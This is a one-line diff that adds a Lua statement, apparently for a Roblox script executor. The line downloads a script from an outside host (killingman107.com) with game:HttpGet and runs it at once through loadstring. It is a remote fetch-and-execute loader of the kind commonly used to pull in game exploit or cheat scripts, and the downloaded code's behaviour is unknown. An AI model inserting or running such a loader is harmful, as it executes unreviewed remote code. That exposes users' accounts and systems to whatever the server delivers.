@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://killingman107.com/Assasine03/SL2AF.lua", true))()
